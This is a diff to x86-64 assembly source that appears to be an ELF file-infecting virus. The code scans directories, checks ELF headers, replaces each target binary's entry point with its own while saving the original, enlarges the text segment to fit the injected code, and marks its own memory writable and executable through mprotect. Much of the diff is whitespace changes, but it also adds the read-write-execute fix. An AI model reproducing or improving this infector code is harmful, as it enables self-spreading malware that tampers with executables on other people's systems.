@@ -1,5 +1,5 @@
-				global			main
 				default			rel
+				global			main
 main:
 sc:
 				push			rbp
@@ -21,15 +21,17 @@ sc:
 				inc				rcx
 				jmp				.loop
 .end:
-				lea				rdi,					[sc_data]
+				mov				rdi,					qword[sc_entry]
+				add				rdi,					sc_end - sc
 				and				rdi,					0xfffffffffffff000
 				mov				rsi,					sc_data_end - sc_data
 				add				rsi,					0x1000
+				mov				rdx,					7
 				mov				rax,					10
 				syscall
 
-				mov				qword[sc_glob],			rsp
-				add				qword[sc_glob],			24
+				mov				qword[sc_glob],		rsp
+				add				qword[sc_glob],		24
 
 				lea				rdi,					[sc_dir_1]
 				call			sc_proc_dir
@@ -170,23 +172,23 @@ sc_proc_entries:
 				pop				rbp
 				ret
 sc_update_mem:
-				mov				rdi,					qword[sc_glob]
-				mov				r8,						qword[rdi+0x50] ;hdrs.txt
-				mov				r9,						qword[rdi+0x48]	;hdrs.elf
+				mov				rdi,						qword[sc_glob]
+				mov				r8,							qword[rdi+0x50] ;hdrs.txt
+				mov				r9,							qword[rdi+0x48]	;hdrs.elf
 
-				mov				rdx,					qword[r8+0x10]
-				add				rdx,					qword[r8+0x28]
+				mov				rdx,						qword[r8+0x10]
+				add				rdx,						qword[r8+0x28]
 				mov				qword[sc_entry],		rdx
 				
-				mov				rdx,					qword[r9+0x18]
+				mov				rdx,						qword[r9+0x18]
 				mov				qword[sc_real_entry],	rdx
 				
-				mov				rdx,					qword[sc_entry]
-				mov				qword[r9+0x18],			rdx
+				mov				rdx,						qword[sc_entry]
+				mov				qword[r9+0x18],				rdx
 				
-				mov				rsi,					qword[rdi+0x30]
-				add				qword[r8+0x20],			rsi
-				add				qword[r8+0x28],			rsi
+				mov				rsi,						qword[rdi+0x30]
+				add				qword[r8+0x20],				rsi
+				add				qword[r8+0x28],				rsi
 				
 				ret
 sc_set_x_pad:
@@ -317,10 +319,10 @@ sc_test_elf_hdr:
 
 				cmp				word[r9+0x10],			3
 				jne				.error
- .success:
+.success:
  				xor				rax,					rax
 				ret
- .error:
+.error:
  				mov				rax,					-1
 				ret
 sc_write_mem:
